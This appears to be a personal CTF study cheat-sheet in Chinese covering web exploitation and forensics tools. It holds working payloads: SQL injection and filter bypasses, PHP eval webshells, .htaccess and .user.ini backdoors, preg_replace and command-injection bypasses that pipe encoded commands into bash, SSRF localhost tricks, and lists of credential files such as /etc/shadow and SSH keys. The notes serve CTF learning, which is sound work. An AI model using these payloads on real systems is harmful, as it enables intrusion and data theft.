---
title: CTF_Marks
date: 2023-11-01 20:16:11
tags:
- ctf
---

# SQL

[【精选】攻防世界之supersqli_攻防世界supersqli_金 帛的博客-CSDN博客](https://blog.csdn.net/l2872253606/article/details/123362430)

## show

show databases

show tables

当纯数字字符串是表名的时候需要加反引号:

show columns from \`1919810931114514\`

反引号表示内容为表明

## handler

[【MySQL】MySQL 之 handler 的详细使用及说明_mysql handler-CSDN博客](https://blog.csdn.net/qq_43427482/article/details/109898934)

##### 1、打开句柄

```mysql
handler handler_table open;#这里可以使用别名
```

##### 2、查看数据

```mysql
handler handler_table read first;
handler handler_table read next;
```

payload:
```
1';use supersqli;handler `1919810931114514` open as p;handler p read first;
```



## 预编译绕过法

[什么是MySQL的预编译？_mysql 预编译-CSDN博客](https://blog.csdn.net/bb15070047748/article/details/107266400)

```
-1';

set @sql = CONCAT('sele','ct flag from `1919810931114514`;');
#@表示变量
prepare stmt from @sql;

EXECUTE stmt;#
```

感觉像是set设置变量值然后在语句中替换，使用concat绕过关键字过滤

## 修改原查询法

如果没有过滤alter，把默认展示的字段名字修改，把想看的字段名字、表明等修改为默认展示的名字

将放着flag的表1919810931114514名字改成words

alter table `1919810931114514` rename to words

表里头字段名flag改成id

alter table words change flag id varchar(100)

- `ALTER TABLE words` 表示您要修改的表是名为 `words` 的表。

- ```
  CHANGE flag id varchar(100)
  ```

   是实际的修改部分。它的含义是：

  - `CHANGE` 表示您要更改一个列的属性。
  - `flag` 是要更改的列的当前名称。
  - `id` 是要将该列更改为的新名称。
  - `varchar(100)` 是新的数据类型，将该列更改为 VARCHAR 类型，最大长度为 100 个字符。

## 过滤

- strstr函数不区分大小写，所以我们可以改一下大小写来绕过strstr函数
- 过滤了union select，我们用union all select 就可以绕过



## 子查询

[sql中的无关子查询与相关子查询和集合查询详细举例说明_无关子查询和相关子查询_ctf^_^的博客-CSDN博客](https://blog.csdn.net/m0_63525319/article/details/127982141)

![image-20231103001841549](https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311030020659.png)

相当于临时新建了一个a表，username字段放入admin，password字段放入123，用来绕过其后的验证：

```
query ("select username,password from ".$this->table." where username='".$this->username."' and password='".$this->password."'");
```

这里实际相当于注入了一个表



## 非预期-load_file

```
?no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4--+
```

如果猜到路径，直接load_file读取



# FileUpload

[【精选】攻防世界easyupload （web新手）_sean7777777的博客-CSDN博客](https://blog.csdn.net/yuanxu8877/article/details/128071631)

## payload

```
<?php eval($_POST['cmd']);?>
<?= eval($_POST[1]);?>
<script language="php">eval($_POST[1]);</script>
```

## .htaccess

```
<FilesMatch "shell" >
SetHandler application/x-httpd-php
</FilesMatch>
```

将当前目录下文件名为shell的文件当成php来解析

```
AddType application/x-httpd-php .mochu
```

将别的后缀名文件内容解析为php程序

## .user.[ini文件](https://so.csdn.net/so/search?q=ini文件&spm=1001.2101.3001.7020)

具体参考[.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html)

在 `.user.ini` 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。

而且，和`php.ini`不同的是，`.user.ini`是一个能被动态加载的ini文件。也就是说我修改了`.user.ini`后，不需要重启服务器中间件，只需要等待`user_ini.cache_ttl`所设置的时间（默认为300秒），即可被重新加载。

在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。

.user.ini

```
auto_prepend_file=shell.jpg
```

shell.jpg

```
GIF89a
<?php eval($_P0ST['a']); ?>
```



## 后缀

利用了一个Linux的目录结构特性 , 请看下面代码：

![20190907181102.png](https://raw.githubusercontent.com/handbye/images/master/20190907181102.png)

这里访问 `./1.php/2.php/..` 代表访问 `2.php`的父目录 , 也就是访问 `1.php` 。

因此这里构造数据包时 , 可以构造如下POST数据

```
con=<?php @eval($_POST[cmd]);?>&file=test.php/1.php/..
```





### 后缀名

```
php
php2
php3
php4
php5
pHp
pHp2
pHp3
pHp4
pHp5
html
htm
phtml
pht
Html
Htm
pHtml
asp
aspx
asa
asax
ashx
asmx
cer
aSp
aSpx
aSa
aSax
aScx
aShx
aSmx
cEr
jsp
jspa
jspx
jsw
jxv
jspf
jtml
JSp
jSpx
jSpa
jSw
jSv
jSpf
jHtml
asp/test.jpg
asp;.jpg
cer/test.jpg
cer;.jpg
asa/test.jpg
asa;.jpg
aSp/test.jpg
aSp;.jpg
cEr/test.jpg
cEr;.jpg
aSa/test.jpg
aSa;.jpg
jpg/xx.php
jpg/xx.pHp
jpg/.php
jpg/.pHp
php.xs.aa
php2.aa
php3.aa
php4.aa
php5.aa
pHp.aa
pHp2.aa
pHp3.aa
pHp4.aaa
pHp5.aa
html.aa
htm.aa
phtml.aa
pht.aaa
Html.aaa
Htm.aa
pHtml.aa
php::$DATA

```









# php相关

## RCE-变量动态调用函数

[buuctf-[CISCN 2019 初赛\]Love Math（小宇特详解）_小宇特详解的博客-CSDN博客](https://blog.csdn.net/xhy18634297976/article/details/123148026)

php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat/flag’);

```
$a='system';
$a('cat/flag');

payload:
?c=($_GET[a])($_GET[b])&a=system&b=cat /flag
```

### hex2bin() 函数

hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。

[ASCII字符串到16进制在线转换工具 - Coding.Tools](https://coding.tools/cn/ascii-to-hex)

### base_convert()函数

base_convert()函数能够在任意进制之间转换数字

hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin

hex2bin=base_convert(37907361743,10,36)

### dechex()函数

dechex()函数将10进制数转换为16进制的数

[十六进制转十进制| 16进制转10进制 | 在线进制转换工具 (sojson.com)](https://www.sojson.com/hexconvert/16to10.html)

## RCE-preg_replace

[php代码审计之preg_replace函数_php preg_replace-CSDN博客](https://blog.csdn.net/giaogiao123/article/details/121217533)

1./e修饰符必不可少
2.你必须让 subject 中有 pattern 的匹配。
3.可能跟php版本有关系,受用条件也只限于5.5到5.6的php版本
4.满足可变变量的条件

payload：

\S*=${cmd}

直接传参\S*=${@eval($_POST['cmd'])} 就可以蚁剑连接了

## 路径遍历

?/../flag = /../flag 这里的问号不会影响



## 反序列化 POP chains

![image-20231110111419036](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231110111419036.png)

[【精选】php反序列化—POP 链的构造利用_反序列化pop链-CSDN博客](https://blog.csdn.net/cosmoslin/article/details/120297881)

[PHP: popen - Manual](https://www.php.net/manual/zh/function.popen.php)

```
popen(string $command, string $mode): resource|false
```

返回一个和 [fopen()](https://www.php.net/manual/zh/function.fopen.php) 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 [pclose()](https://www.php.net/manual/zh/function.pclose.php) 来关闭。此指针可以用于 [fgets()](https://www.php.net/manual/zh/function.fgets.php)，[fgetss()](https://www.php.net/manual/zh/function.fgetss.php) 和 [fwrite()](https://www.php.net/manual/zh/function.fwrite.php)。 当模式为 'r'，返回的文件指针等于命令的 STDOUT，当模式为 'w'，返回的文件指针等于命令的 STDIN。

```
<?php
$handle = popen("/bin/ls", "r");
?>
```



[PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec() - gaohj - 博客园 (cnblogs.com)](https://www.cnblogs.com/gaohj/p/3267692.html)

```
function passthru(string $command,int[optional] $return_value)
```

passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。

```
<?php
        passthru("ls");
?>
```

## 绕过wakeup

[PHP反序列化中wakeup()绕过总结 – fushulingのblog](https://fushuling.com/index.php/2023/03/11/php反序列化中wakeup绕过总结/)

> 可以利用cve-2016-7124进行绕过，将payload里ctf后面那个1改为2就行了，因为真实的属性其实只有一个，那就是那个flag，改为2之后对象属性个数的值就大于真实的属性个数了，因此可以绕过wakeup()，



### 非public属性

[BUUCTF [极客大挑战 2019\]PHP 1_buuojphp1-CSDN博客](https://blog.csdn.net/weixin_45642610/article/details/112591542)

区别只在于对变量名添加了标记：

```
public无标记，变量名不变，长度不变: s:2:"op";i:2;
protected在变量名前添加标记%00*%00，长度+3: s:5:"%00*%00op";i:2;
private在变量名前添加标记%00(classname)%00，长度+2+类名长度: s:17:"%00FileHandler_Z%00op";i:2;
```

O:6:"class1":3:{s:1:"a";s:1:"1";s:4:"*b";s:5:"ThisB";s:9:"class1c";s:5:"ThisC";}*
*对象序列化后的结构为：*
*O:对象名的长度:"对象名":对象属性个数:{s:属性名的长度:"属性名";s:属性值的长度:"属性值";}a是public类型的变量，s表示字符串，1表示变量名的长度，a是变量名。b是protected类型的变量，它的变量名长度为4，也就是b前添加了%00*%00。所以，protected属性的表示方式是在变量名前加上%00*%00。c是private类型的变量，c的变量名前添加了%00类名%00。所以，private属性的表示方式是在变量名前加上%00类名%00。虽然Test类中有test1方法，但是，序列化得到的字符串中，只保存了公有变量a，保护变量b和私有变量c，并没保存类中的方法。也可以看出，序列化不保存方法。



## MD5

这里提供一些md5以后是0e开头的值：

```
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s1885207154a
0e509367213418206700842008763514

s1502113478a
0e861580163291561247404381396064

s1885207154a
0e509367213418206700842008763514

s1836677006a
0e481036490867661113260034900752

s155964671a
0e342768416822451524974117254469

s1184209335a
0e072485820392773389523109082030

s1665632922a
0e731198061491163073197128363787

s1502113478a
0e861580163291561247404381396064

s1836677006a
0e481036490867661113260034900752

s1091221200a
0e940624217856561557816327384675

s155964671a
0e342768416822451524974117254469

s1502113478a
0e861580163291561247404381396064

s155964671a
0e342768416822451524974117254469

s1665632922a
0e731198061491163073197128363787

s155964671a
0e342768416822451524974117254469

s1091221200a
0e940624217856561557816327384675

s1836677006a
0e481036490867661113260034900752

s1885207154a
0e509367213418206700842008763514

s532378020a
0e220463095855511507588041205815

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s214587387a
0e848240448830537924465865611904

s1502113478a
0e861580163291561247404381396064

s1091221200a
0e940624217856561557816327384675

s1665632922a
0e731198061491163073197128363787

s1885207154a
0e509367213418206700842008763514

s1836677006a
0e481036490867661113260034900752

s1665632922a
0e731198061491163073197128363787

s878926199a
0e545993274517709034328855841020
```



强碰撞：

```
%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
```

```
%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```



## 内容读取

file_get_content()可以读取php://filter伪协议。

[file_get_contents](https://so.csdn.net/so/search?q=file_get_contents&spm=1001.2101.3001.7020)、highlight_file() ，show_source()

readfile(/tmp/flagoefiu4r93)

scandir可以扫描目录（需要打印）



## 弱比较 ==

> 使用\==比较时，true是可以和任何类型的字符串或数字相等，返回true，当然0和false和null除外（true\==0或true\==false或true==null）



# python相关

## SSTI

查看config：

{{config}} 可以获取当前设置，如果题目是这样的：

> app.config ['FLAG'] = os.environ.pop（'FLAG'）

可以直接访问 {{config['FLAG']}} 或者 {{config.FLAG}} 得到 flag。

同样可以找到 config。

```python
{{self.__dict__._TemplateReference__context.config}}
```



## eval()

https://blog.csdn.net/giaogiao123/article/details/119513378?spm=1001.2014.3001.5501

我们平常的认知都是去写入一句话木马到一个php文件或者是jsp文件，然后连接那个文件的目录，实际上，不需要写入文件，我们照样可以利用eval函数造成一句话的形成最后拿下网站webshell

```
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
?>

```

**eval()函数在执行时其中有多个函数，则第一个必须执行正确，第一个以后也必须是函数，但是正确与否都可以执行。**

```
eval('phpinfo();phpinfo();fdsfsdfds'.'asdasdsa();');//成功执行
eval('asdasdsa();phpinfo();fdsfsdfds'.'asdasdsa();');//执行失败
```

```
http://localhost/12.php?c=@eval($_POST[cmd]);  不行
```

```
http://localhost/12.php?c=echo 1;@eval($_POST[cmd]);  行
```

再第二种情况下，我们可以使用蚁剑连接





# MISC

## 参考步骤

### 图片

- 查看通道二维码
- 查看内嵌文件 stegseek、zsteg 分离 binwalk 

### 未知文件

- winhex 看文件头修改后缀

  - core：string |grep

  - pdf：文件分离等 foremost

    

### 流量分析

- 直接find

- 提取文件 foremost -t all -i 

- 过滤本网络查看异常

  

## 流量分析

- 如果flag存在于流量中，那么把包传入winhex，直接搜索flag等关键字

- http contains “shell”

## 一些思路

[心仪的公司_心仪的公司攻防_红烧兔纸的博客-CSDN博客](https://blog.csdn.net/weixin_39934520/article/details/121959797)

> ip.addr = 192.168.1.0/24过滤内网ip
>
> 192.168.1.111大量访问外网，猜测是192.168.1.108做反向代理攻击过滤192.168.1.108追踪tcp流得到filag

[攻防世界 Misc 心仪的公司-CSDN博客](https://blog.csdn.net/MrTreebook/article/details/123442355)

```
strings webshell.pcapng | grep "{"
```

[xctf攻防世界 MISC高手进阶区 low_攻防世界low-CSDN博客](https://blog.csdn.net/l8947943/article/details/122692365)

用画图工具打开bmp图片，其次将其另存为png格式。接着使用stegsolve打开图片

## pyc

假设，有一个名为 lxk.py 的源文件：

print("Hello Python!")
要编译为 *.pyc 文件，需要引入 Python 中的模块 py_compile，在交互模式下输入：

```
>>> import py_compile
>>> py_compile.compile("lxk.py")
```

#### 方式二：

命令行下：**python -m py_compile test.p**

### 反编译

首先安装库 `uncompyle:  pip install uncompyle`

命令行下：uncompyle6 test.pyc > test1.py 

## formost 分离文件

c:\> foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t <type>] [-s <blocks>] [-k <size>]
    [-b <size>] [-c <file>] [-o <dir>] [-i <file]

> -V  - 显示版权信息并退出
> -t  - 指定文件类型.  (-t jpeg,pdf ...)
> -d  - 打开间接块检测 (针对UNIX文件系统)
> -i  - 指定输入文件 (默认为标准输入)
> -a  - 写入所有的文件头部, 不执行错误检测(损坏文件)
> -w  - 向磁盘写入审计文件，不写入任何检测到的文件
> -o  - 设置输出目录 (默认为./output)
> -c  - 设置配置文件 (默认为foremost.conf)
> -q  - 启用快速模式. 在512字节边界执行搜索.
> -Q  - 启用安静模式. 禁用输出消息.
> -v  - 详细模式. 向屏幕上记录所有消息。

foremost -i 分离隐藏文件

foremost -t 需要恢复文件类型后缀(如jpg) -i 扫描的分区 -o 指定存放文件的目录

foremost -t all -i f9809647382a42e5bfb64d7d447b4099.pcap

> 这个例子中，命令 `foremost -t all -i f9809647382a42e5bfb64d7d447b4099.pcap` 将尝试从名为 `f9809647382a42e5bfb64d7d447b4099.pcap` 的 PCAP 文件中找回所有可能的文件类型。这些文件将会被提取并保存到指定的输出目录中。

zsteg:

zsteg stego100.png



## binwalk 检索隐写

binwalk xxx

### 常见文件头:

```
JPEG (jpg)，文件头：FF D8 FF
PNG (png)，文件头：89 50 4E 47     【参考：png文件头详解】89 50 4e 47 0d 0a 1a 0a
GIF (gif)，文件头：47 49 46 38
Windows Bitmap (bmp)，文件头：42 4D [参考：bmp文件格式详解]42 4D 36 0C 30 00 00 00 00 00 36 00 00 00 28 00 00 00 56 05 00 00 00 03 00 00 01 00 18 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00python反编译文件pyc的头：03 F3 0D 0A  
（实验吧，py的交易会用到）pyd的文件头：4D 5A 90 00
ZIP Archive (zip)，文件头：50 4B 03 04 ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件
rar文件: 52 61 72 217z文件头：37 7A BC AF 27 1C（实验吧，有趣的文件用到了）
MS Word/Excel (xls.or.doc)，文件头：D0CF11E0
CAD (dwg)，文件头：41433130
Adobe Photoshop (psd)，文件头：38425053
Rich Text Format (rtf)，文件头：7B5C727466
XML (xml)，文件头：3C3F786D6C
HTML (html)，文件头：68746D6C3E
Email [thorough only] (eml)，文件头：44656C69766572792D646174653A
Outlook Express (dbx)，文件头：CFAD12FEC5FD746F
Outlook (pst)，文件头：2142444E
MS Access (mdb)，文件头：5374616E64617264204A
WordPerfect (wpd)，文件头：FF575043
Postscript (eps.or.ps)，文件头：252150532D41646F6265
Adobe Acrobat (pdf)，文件头：255044462D312E
Quicken (qdf)，文件头：AC9EBD8F
Windows Password (pwl)，文件头：E3828596
RAR Archive (rar)，文件头：52617221
Wave (wav)，文件头：57415645
AVI (avi)，文件头：41564920
Real Audio (ram)，文件头：2E7261FD
Real Media (rm)，文件头：2E524D46
MPEG (mpg)，文件头：000001BA
MPEG (mpg)，文件头：000001B3
Quicktime (mov)，文件头：6D6F6F76
Windows Media (asf)，文件头：3026B2758E66CF11
MIDI (mid)，文件头：4D546864
```

## Core文件简介

Core文件其实就是内存的映像，当程序崩溃时，存储内存的相应信息，主用用于对程序进行调试。当程序崩溃时便会产生core文件，其实准确的应该说是core dump 文件,默认生成位置与可执行程序位于同一目录下，文件名为core.***,其中***是某一数字。

我们可以使用strings命令查看字符串内容
[strings命令](https://blog.csdn.net/stpeace/article/details/46641069)打印文件中可打印的字符

## 分解合并图片

[【愚公系列】2021年11月 攻防世界-进阶题-MISC-019(glance-50)-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1910472)

kali 的 convert 命令可以分解图片：

convert glance.gif flag.png

montage合并图片

```
montage flag*.png -tile x1 -geometry +0+0 flag.png
```



### montage

> 1. 把当前目录下的所有.png格式的图片拼起来
>
> montage.exe *.png -geometry +0+0 -background #00000000 big.png
>
> 2. 把当前目录和所有子目录下的.png格式的图片拼起来
>
> dir /b /s *.png > filelist.txt
> montage.exe @filelist.txt -geometry +0+0 -background #00000000 big.png
>
> 拼图时会自动调整行列上的图片数，如果需要指定，加上参数-tile，例:
>
> dir /b /s *.png > filelist.txt
> montage.exe @filelist.txt -geometry +0+0 -tile 2x4 -background #00000000 big.png
>
> 原文链接：https://blog.csdn.net/zaffix/article/details/7058587



[攻防世界-Misc-glance-50(convert分离gif、montage图片拼接)-mma-ctf-2nd-2016-CSDN博客](https://blog.csdn.net/zz_Caleb/article/details/89490494)

> convert glance.gif flag.png
>
> montage flag*.png -tile x1 -geometry +0+0 flag.png
>
> -tile是拼接时每行和每列的图片数，这里用x1，就是只一行
>
> -geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可



### gaps

> –image 指向拼图的路径
>
> –size 拼图块的像素尺寸
>
> –generations 遗传算法的代的数量
>
> –population 个体数量
>
> –verbose 每一代训练结束后展示最佳结果
>
> –save 将拼图还原为图像

```
gaps --image=test.png --generation=30 --population=300 --size=120

```

size比较重要，这里影响着图片数量，图片数量要和本来的图片数相等

> # Creating puzzles from images
>
> To create puzzle from image use `gaps create`
>
> ```
> gaps create images/pillars.jpg puzzle.jpg --size=64
> ```
>
> 
>
> will create puzzle with 240 pieces from `images/pillars.jpg` where each piece is 64x64 pixels.
>
> Run `gaps create --help` for detailed help.
>
> 注：根据给定的拼图大小，创建的拼图图像尺寸可能小于原始图像。从原始图像中裁剪出最大可能的矩形。

> # Solving puzzles
>
> In order to solve puzzles, use `gaps run`:
>
> ```
> gaps run puzzle.jpg solution.jpg --generations=20 --population=600
> ```
>
> 
>
> This will start genetic algorithm with initial population of 600 and 20 generations.
>
> Following options are provided:
>
> | Option          | Description                                  |
> | --------------- | -------------------------------------------- |
> | `--size`        | 拼图大小（像素）                             |
> | `--generations` | 遗传算法的代数                               |
> | `--population`  | Number of individuals in population          |
> | `--debug`       | Show the best solution after each generation |
>
> Run `gaps run --help` for detailed help.



> ## Size detection
>
> If you don't explicitly provide `--size` argument to `gaps run`, piece size will be detected automatically.
>
> However, you can always provide `gaps run` with `--size` argument explicitly:
>
> ```
> gaps run puzzle.jpg solution.jpg --generations=20 --population=600 --size=48
> ```



## 压缩包

有时候不同压缩工具解压的结果有差异，需要都试试





# 文件包含

## 伪协议：

php://input伪协议以POST传参

data://text/plain,welcome to the zjctf

?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=

php://filter/read=convert.base64-encode/resource=useless.php



```
php://filter/convert.iconv.UTF-7.UCS-4*/resource=xxx.php
```

## iconv:

```
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*

```



**windows常见的敏感文件路径:**

```cobol
C:\boot.ini //查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\Windows\php.ini //php配置信息
C:\Windows\my.ini //Mysql配置信息
C:\Windows\win.ini //Windows系统的一个基本系统配置文件

```

**Linux常见的敏感文件路径:**

```
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_ras.keystore
/root/.ssh/known_hosts //记录每个访问计算机用户的公钥
/etc/passwd
/etc/shadow
/etc/my.cnf //mysql配置文件
/etc/httpd/conf/httpd.conf //apache配置文件
/root/.bash_history //用户历史命令记录文件
/root/.mysql_history //mysql历史命令记录文件
/proc/mounts //记录系统挂载设备
/porc/config.gz //内核配置文件
/var/lib/mlocate/mlocate.db //全文件路径
/porc/self/cmdline //当前进程的cmdline参数

- /etc/passwd
- /proc/self/cmdline，用于获取当前启动进程的完整命令。
- /proc/self/maps获取堆栈分布
- /proc/self/mem得到进程的内存内容

```

# RCE

```
cat fl*  用匹配任意 
cat fla 用*匹配任意
ca\t fla\g.php        反斜线绕过
cat fl''ag.php        两个单引号绕过
echo "Y2F0IGZsYWcucGhw" | base64 -d | bash      
//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数

echo "63617420666c61672e706870" | xxd -r -p | bash       
//hex编码绕过(引号可以去掉)

echo "63617420666c61672e706870" | xxd -r -p | sh     
//sh的效果和bash一样

cat fl[a]g.php       用[]匹配

a=fl;b=ag;cat $a$b          变量替换
cp fla{g.php,G}    把flag.php复制为flaG
ca${21}t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),${x}(x>=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的
```



# 源码备份

常见的网站源码备份文件后缀:

tar.gz，zip，rar，tar

常见的网站源码备份文件名：

web，website，backup，back，www，wwwroot，temp

# SSRF

127.0.0.1被禁止访问，则可以尝试各种变形

```
?url=http://@127.0.0.1:8000@/api/internal/secret
?url=http://2130706433:8000/api/internal/secret
?url=http://0x7f.0x0.0x0.0x1:8000/api/internal/secret
?url=http://[::127.0.0.1]:8000/api/internal/secret
?url=http://127。0。0。1:8000/api/internal/secret
?url=http://127.1:8000/api/internal/secret
?url=http://0.0.0.0:8000/api/internal/secret
?url=http://127.127.127.127:8000/api/internal/secret
```

127.0.0.1=0.0.0.0=127.127.127.127



# 工具

## cyberchef:

affine:仿射密码

bacon：培根密码

